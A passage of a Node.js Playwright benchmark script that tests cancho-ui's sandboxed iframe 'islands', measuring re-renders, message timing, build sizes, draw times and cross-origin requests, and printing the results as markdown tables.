        ? `var iframeHtml = ${JSON.stringify(iframe).replace(/<\//g, '<\\/')}; function render(n) { var root = document.getElementById('root'); root.textContent = ''; root.insertAdjacentHTML('beforeend', '<p>static</p>' + iframeHtml); var s = document.createElement('span'); s.textContent = 'count ' + n; root.appendChild(s); }`
        : `function render(n) { var root = document.getElementById('root'); var walker = document.createTreeWalker(root, NodeFilter.SHOW_COMMENT); var start; for (var c = walker.nextNode(); c; c = walker.nextNode()) { if (c.data === 'cui:0') start = c; } while (start.nextSibling && start.nextSibling.data !== '/cui:0') { start.parentNode.removeChild(start.nextSibling); } var s = document.createElement('span'); s.textContent = 'count ' + n; start.parentNode.insertBefore(s, start.nextSibling); }`;
      pages['/i'] = `<!doctype html><html><body><div id="root">${skeleton}</div><script>window.__starts = []; window.__loads = 0; addEventListener('message', function (e) { if (e.data && e.data.started) { window.__starts.push(e.data.started); } }); document.getElementById('island').addEventListener('load', function () { window.__loads++; }); window.__first = document.getElementById('island'); ${script} setTimeout(function () { render(1); }, 300); setTimeout(function () { render(2); }, 600); setTimeout(function () { render(3); }, 900);</script></body></html>`;
      await page.goto(`${A}/i`);
      await sleep(1600);
      const r = await page.evaluate(() => ({ starts: window.__starts.length, loads: window.__loads, same: document.getElementById('island') === window.__first }));
      console.log(`| ${mode} | ${r.loads} | ${r.same ? 'yes' : 'no'} | ${r.starts > 1 ? `yes, ${r.starts} starts` : 'no, 1 start'} |`);
      await ctx.close();
    }
  }

  // ---------- race: a message posted before the island has loaded ----------
  if (on('race')) {
    console.log('\n## race: the page posts a message at the moments below; the island counts what it received (20 runs each)\n');
    console.log('| posted | received by the island |\n|---|---:|');
    pages['/r'] = `<!doctype html><html><body></body></html>`;
    const { ctx, page } = await newPage();
    await page.goto(`${A}/r`);
    const doc2 = srcdoc({ csp: CSP_A, scripts: ["window.__n = 0; addEventListener('message', function (e) { if (e.data && e.data.props) { window.__n++; } if (e.data && e.data.ask) { parent.postMessage({ got: window.__n }, '*'); } }); parent.postMessage({ ready: 1 }, '*');"] });
    const counts = await page.evaluate(async (doc) => {
      const res = { 'right after the iframe is inserted': 0, 'at the iframe\'s load event': 0, 'when the island says it is ready': 0 };
      for (let i = 0; i < 20; i++) {
        for (const when of Object.keys(res)) {
          const f = document.createElement('iframe'); f.setAttribute('sandbox', 'allow-scripts'); f.srcdoc = doc;
          const msg = (pred) => new Promise((ok) => { const h = (e) => { if (e.source === f.contentWindow && e.data && pred(e.data)) { removeEventListener('message', h); ok(e.data); } }; addEventListener('message', h); });
          const ready = msg((d) => d.ready);
          document.body.appendChild(f);
          if (when.startsWith('right after')) { try { f.contentWindow.postMessage({ props: 1 }, '*'); } catch (e) {} }
          if (when.startsWith('at the iframe')) { await new Promise((ok) => f.addEventListener('load', ok)); f.contentWindow.postMessage({ props: 1 }, '*'); }
          await ready;
          if (when.startsWith('when the island')) { f.contentWindow.postMessage({ props: 1 }, '*'); }
          await new Promise((ok) => setTimeout(ok, 20));
          const answer = msg((d) => d.got !== undefined);
          f.contentWindow.postMessage({ ask: 1 }, '*');
          res[when] += (await answer).got;
          f.remove();
        }
      }
      return res;
    }, doc2);
    for (const [k, v] of Object.entries(counts)) { console.log(`| ${k} | ${v} of 20 |`); }
    await ctx.close();
  }

  // ---------- compiled: the real hero and the 11 cairns through the compiler ----------
  if (on('compiled')) {
    const os = require('os');
    const { spawnSync } = require('child_process');
    const crypto = require('crypto');
    const BIN = path.join(__dirname, '..', 'target', 'debug', 'cancho-ui');
    const sha = (b) => crypto.createHash('sha256').update(b).digest('hex');
    console.log('\n## compiled: the real rocks.js and scene.js (byte for byte, pinned by hash), written as islands and built by `cancho-ui build --page`; 4x CPU throttle\n');
    const probe = await newPage({ viewport: { width: 412, height: 800 } });
    await probe.page.goto(`${A}/assets/rocks.js`).catch(() => {});
    const css = await islandCss(probe.page);
    await probe.ctx.close();
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'islands-compiled-'));
    fs.mkdirSync(path.join(dir, 'assets'));
    const put = (name, text) => { fs.writeFileSync(path.join(dir, 'assets', name), text); return sha(Buffer.from(text)); };
    const h = { rocks: put('rocks.js', ROCKS), scene: put('scene.js', SCENE) };
    // the glue: what the page's hero() and cairns() do, as the island's own entry
    h.heroGlue = put('island-hero.js', `(function () {
    var wrap = document.createElement('div'); wrap.className = 'scene';
    var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.setAttribute('viewBox', '0 0 640 600'); svg.setAttribute('preserveAspectRatio', 'xMidYMax meet');
    wrap.appendChild(svg); document.body.appendChild(wrap);
    window.Scene.draw(svg);
    if (matchMedia('(prefers-reduced-motion: reduce)').matches) { return; }
    cancho.onprops(function (p) { if (p.pointer) { svg.style.setProperty('--px', p.pointer.x.toFixed(3)); svg.style.setProperty('--py', p.pointer.y.toFixed(3)); } });
})();
`);
    h.cairnGlue = put('island-cairn.js', `(function () {
    var R = window.Rocks, el = R.el;
    var c = document.createElement('div'); c.className = 'cairn'; document.body.appendChild(c);
    var svg = el('svg', { viewBox: '0 0 84 58', 'aria-hidden': 'true' }, c);
    cancho.onprops(function (p) {
        if (c.firstChild.childNodes.length) { return; }
        [[42, 58, 32, 14, 3], [44, 38, 22, 11, 4], [41, 21, 13, 8, 5]].forEach(function (s, i) {
            var g = el('g', { class: 'st' }, svg);
            R.rock(g, { seed: 'cairn' + p.seed + i, x: s[0], baseY: s[1], rx: s[2], ry: s[3], n: 9, cracks: 0, lichen: 0, jitter: 0.12 });
        });
    });
    var io = new IntersectionObserver(function (es) { es.forEach(function (e) { if (e.isIntersecting) { c.classList.add('in'); io.disconnect(); } }); }, { threshold: 0.25 });
    io.observe(c);
})();
`);
    h.heroCss = put('island-hero.css', css + '\nbody{margin:0}\n');
    h.cairnCss = put('island-cairn.css', css + '\nbody{margin:0} .cairn{margin:0} .cairn svg{width:5.2rem;height:3.6rem;overflow:visible}\n');
    const cairns = Array.from({ length: 11 }, (_, n) => `Cairn { seed: ${n} }`).join('\n            ');
    fs.writeFileSync(path.join(dir, 'page.cui'), `island Hero {
    script: "assets/rocks.js" sha256: "${h.rocks}";
    script: "assets/scene.js" sha256: "${h.scene}";
    script: "assets/island-hero.js" sha256: "${h.heroGlue}";
    style: "assets/island-hero.css" sha256: "${h.heroCss}";
    decorative: true;
    width: 640;
    height: 600;
    props { pointer: Pointer; }
}
island Cairn {
    script: "assets/rocks.js" sha256: "${h.rocks}";
    script: "assets/island-cairn.js" sha256: "${h.cairnGlue}";
    style: "assets/island-cairn.css" sha256: "${h.cairnCss}";
    decorative: true;
    width: 84;
    height: 58;
    props { seed: Int; }
}
component Page {
    view {
        Column {
            Heading { level: 1 "Sealed islands, compiled" }
            Hero { }
            ${cairns}
        }
    }
}
`);
    const out = path.join(dir, 'out');
    const t = Date.now();
    const r = spawnSync(BIN, ['build', path.join(dir, 'page.cui'), '--page', '-o', out], { encoding: 'utf8' });
    if (r.status !== 0) { console.log(r.stdout + r.stderr); throw new Error('the compiled page did not build'); }
    const html = fs.readFileSync(path.join(out, 'index.html'), 'utf8');
    const js = fs.readFileSync(path.join(out, 'app.js'), 'utf8');
    console.log(`built in ${Date.now() - t} ms: index.html ${html.length.toLocaleString()} B (gzip ${zlib.gzipSync(html).length.toLocaleString()}), app.js ${js.length.toLocaleString()} B; 12 frames, ${html.split('<iframe').length - 1} iframes in the HTML\n`);
    const served = http.createServer((q, rs) => { const f = path.join(out, q.url === '/' ? 'index.html' : q.url.split('?')[0]); fs.readFile(f, (e, d) => { if (e) { rs.statusCode = 404; rs.end(); return; } rs.setHeader('content-type', { '.js': 'text/javascript', '.html': 'text/html' }[path.extname(f)] || 'text/plain'); rs.end(d); }); });
    await new Promise((ok) => served.listen(0, ok));
    console.log('| throttle | all 12 frames drawn after | hero nodes | cairn frames drawn | console errors | requests to another origin | revealed at load / after scrolling |');
    console.log('|---|---:|---:|---:|---:|---:|---|');
    for (const rate of [1, 4]) {
      const { ctx, page } = await newPage({ viewport: { width: 412, height: 700 } });
      const errs = []; const origins = new Set();
      page.on('console', (m) => { if (m.type() === 'error') { errs.push(m.text().slice(0, 120)); } });
      page.on('pageerror', (e) => errs.push(String(e).slice(0, 120)));
      page.on('request', (rq) => { if (!/^(data|about):/.test(rq.url())) { origins.add(new URL(rq.url()).origin); } });
      const cdp = await ctx.newCDPSession(page);
      await cdp.send('Emulation.setCPUThrottlingRate', { rate });
      const t0 = Date.now();
      await page.goto(`http://127.0.0.1:${served.address().port}/`, { waitUntil: 'commit' });
      let drawn = 0, heroNodes = 0;
      while (Date.now() - t0 < 60000) {
        const fs2 = page.frames().filter((f) => f !== page.mainFrame());
        const counts = await Promise.all(fs2.map((f) => f.evaluate(() => document.querySelectorAll('svg *').length).catch(() => 0)));
        drawn = counts.filter((c) => c > 0).length;
        heroNodes = counts[0] || 0;
        if (drawn >= 12) { break; }
        await sleep(25);
      }
      const took = Date.now() - t0;
      const cairnsDrawn = drawn - (heroNodes > 0 ? 1 : 0);
      const inCount = async () => { let n = 0; for (const f of page.frames().filter((x) => x !== page.mainFrame()).slice(1)) { n += await f.evaluate(() => document.querySelector('.cairn') && document.querySelector('.cairn').classList.contains('in') ? 1 : 0).catch(() => 0); } return n; };
      const at0 = await inCount();
      for (let y = 0; y <= 2200; y += 300) { await page.evaluate((y) => window.scrollTo(0, y), y); await sleep(150); }
      await sleep(600);
      const at1 = await inCount();
      console.log(`| ${rate}x | ${took} ms | ${heroNodes} | ${cairnsDrawn} of 11 | ${errs.length}${errs.length ? ' (' + errs[0] + ')' : ''} | ${[...origins].filter((o) => o !== `http://127.0.0.1:${served.address().port}`).length} | ${at0} of 11 / ${at1} of 11 |`);
      await ctx.close();
    }
    served.close();
    if (!process.env.KEEP) { fs.rmSync(dir, { recursive: true, force: true }); } else { console.log('kept', dir); }
  }

  // ---------- map: the real ecosystem map as an open island ----------
  if (on('map')) {
    const os = require('os');
    const { spawnSync } = require('child_process');
    const crypto = require('crypto');
    const ROOT = path.join(__dirname, '..');
    const BIN = path.join(ROOT, 'target', 'debug', 'cancho-ui');
    const sha = (b) => crypto.createHash('sha256').update(b).digest('hex');
    console.log('\n## map: the 24 projects of data/ecosystem.json drawn by examples/map-island/assets/map-draw.js with the real rocks.js (byte for byte), as an OPEN island; the filters, the detail pane and the list are cancho-ui\n');
    const data = JSON.parse(read('data/ecosystem.json'));
    const spots = /var SPOTS = \{[\s\S]*?\n  \};/.exec(read('assets/map.js'));
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'islands-map-'));
    fs.mkdirSync(path.join(dir, 'assets'));
    const put = (name, text) => { fs.writeFileSync(path.join(dir, 'assets', name), text); return sha(Buffer.from(text)); };
    // the layout of today's map: SPOTS of map.js ([x, y, where the name goes]) in place of the example's nine
    let draw = fs.readFileSync(path.join(ROOT, 'examples', 'map-island', 'assets', 'map-draw.js'), 'utf8');
    const real = spots ? spots[0].replace(/^ {2}/gm, '    ').replace(/'([a-z-]+)': \[(\d+), (\d+), '[nsew]'\]/g, "'$1': [$2, $3]").replace(/(\w[\w-]*): \[(\d+), (\d+), '[nsew]'\]/g, "'$1': [$2, $3]").replace("    var SPOTS", "    var SPOTS") : null;
    if (real) { draw = draw.replace(/var SPOTS = \{[\s\S]*?\};/, real.replace(/^\s*var SPOTS = /, 'var SPOTS = ').replace(/\n  \};$/, '\n    };')); }
    const h = { rocks: put('rocks.js', ROCKS), draw: put('map-draw.js', draw), css: put('map-draw.css', fs.readFileSync(path.join(ROOT, 'examples', 'map-island', 'assets', 'map-draw.css'), 'utf8') + read('assets/site.css').split('\n').filter((l) => /^\.(rock|g-)/.test(l)).join('\n')) };
    const places = {};
    for (const q of data.projects) { places[q.id] = { name: q.name, kind: q.kind, stage: q.stage, summary: q.summary, rests_on: q.rests_on || [] }; }
    const lit = (t) => t.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\{/g, '\\{').replace(/\}/g, '\\}');
    const ids = Object.keys(places).map((i) => `"${i}"`).join(', ');
    const pick = '        selected = id;\n        name = json.get(data, id + ".name", id);\n        stage = json.get(data, id + ".stage", "");\n        summary = json.get(data, id + ".summary", "");';
    fs.writeFileSync(path.join(dir, 'map.cui'), `island Places {
    sealed: false;
    script: "assets/rocks.js" sha256: "${h.rocks}";
    script: "assets/map-draw.js" sha256: "${h.draw}";
    style: "assets/map-draw.css" sha256: "${h.css}";
    label: "Map of the cancho projects: each one is a rock.";
    width: 1300;
    height: 810;
    props { places: String; selected: String; kind: String; only_built: Bool; }
    events { Selected: String; }
}
component Ecosystem {
    requires Dom;
    state data: String = "${lit(JSON.stringify(places))}";
    state ids: List[String] = [${ids}];
    state selected: String = "cancho";
    state name: String = "cancho";
    state stage: String = "built";
    state summary: String = "";
    state kind: String = "all";
    state only_built: Bool = false;
    on Selected(id) {\n${pick}\n    }
    on Pick(id) {\n${pick}\n    }
    on All { kind = "all"; }
    on Services { kind = "service"; }
    view {
        Column {
            Heading { level: 1 "The ecosystem" }
            Row { Button { label: "All" on: All } Button { label: "Services" on: Services } }
            Places { places: data selected: selected kind: kind only_built: only_built on: Selected text: "projects" }
            Section { label: "Selected project" id: "detail" Heading { level: 2 "{name}" } Text { "{stage}: {summary}" } }
            Section { label: "All projects" id: "projects" For { over: ids as: id Button { label: id on: Pick(id) } } }
        }
    }
}
`);
    const out = path.join(dir, 'out');
    const r = spawnSync(BIN, ['build', path.join(dir, 'map.cui'), '--page', '-o', out], { encoding: 'utf8' });
    if (r.status !== 0) { console.log(r.stdout + r.stderr); throw new Error('the map did not build'); }
    const html = fs.readFileSync(path.join(out, 'index.html'), 'utf8');
    const js = fs.readFileSync(path.join(out, 'app.js'), 'utf8');
    console.log(`index.html ${html.length.toLocaleString()} B (gzip ${zlib.gzipSync(html).length.toLocaleString()}), app.js ${js.length.toLocaleString()} B (gzip ${zlib.gzipSync(js).length.toLocaleString()}); today's map.js is 21,760 B\n`);
    const served = http.createServer((q, rs) => { const f = path.join(out, q.url === '/' ? 'index.html' : q.url.split('?')[0]); fs.readFile(f, (e, d) => { if (e) { rs.statusCode = 404; rs.end(); return; } rs.setHeader('content-type', { '.js': 'text/javascript', '.html': 'text/html' }[path.extname(f)] || 'text/plain'); rs.end(d); }); });
    await new Promise((ok) => served.listen(0, ok));
    console.log('| throttle | drawn after | rocks | nodes in the island | nodes in the page | selection reaches the island | same host after a render | console errors | requests to another origin |');
    console.log('|---|---:|---:|---:|---:|---|---|---:|---:|');
    for (const rate of [1, 4]) {
      const { ctx, page } = await newPage({ viewport: { width: 1000, height: 900 } });
      const errs = []; const origins = new Set();
      page.on('console', (m) => { if (m.type() === 'error') { errs.push(m.text().slice(0, 100)); } });
      page.on('pageerror', (e) => errs.push(String(e).slice(0, 100)));
      page.on('request', (rq) => { if (!/^(data|about):/.test(rq.url())) { origins.add(new URL(rq.url()).origin); } });
      const cdp = await ctx.newCDPSession(page);
      await cdp.send('Emulation.setCPUThrottlingRate', { rate });
      const t0 = Date.now();
      await page.goto(`http://127.0.0.1:${served.address().port}/`, { waitUntil: 'commit' });
      await page.waitForFunction(() => document.querySelectorAll('.rock').length > 0, null, { timeout: 60000 });
      const took = Date.now() - t0;
      const rocks = await page.evaluate(() => document.querySelectorAll('.rock').length);
      const nodes = await page.evaluate(() => [document.querySelector('[data-cui-island]').querySelectorAll('*').length, document.querySelectorAll('*').length]);
      await page.evaluate(() => { window.__h = document.querySelector('[data-cui-island]'); });
      await page.evaluate(() => document.querySelector('.rock[data-id="cancho-forge"]').dispatchEvent(new MouseEvent('click', { bubbles: true })));
      await sleep(rate * 400);
      const after = await page.evaluate(() => ({ sel: [...document.querySelectorAll('.rock.sel')].map((x) => x.dataset.id).join(), same: document.querySelector('[data-cui-island]') === window.__h, detail: document.getElementById('detail').innerText.split('\n')[0] }));
      await page.click('button:has-text("Services")'); await sleep(rate * 200);
      const dim = await page.evaluate(() => document.querySelectorAll('.rock.dim').length);
      console.log(`| ${rate}x | ${took} ms | ${rocks} | ${nodes[0]} | ${nodes[1]} | ${after.sel} / ${after.detail}; Services dims ${dim} | ${after.same} | ${errs.length}${errs.length ? ' (' + errs[0] + ')' : ''} | ${[...origins].filter((o) => o !== `http://127.0.0.1:${served.address().port}`).length} |`);
      await ctx.close();
    }
    served.close();
    if (!process.env.KEEP) { fs.rmSync(dir, { recursive: true, force: true }); } else { console.log('kept', dir); }
  }

  await browser.close(); site.close(); other.close(); stun.close();
  clearTimeout(watchdog);
})().catch((e) => { console.log(`FAIL ${e.stack || e}`); process.exit(1); });
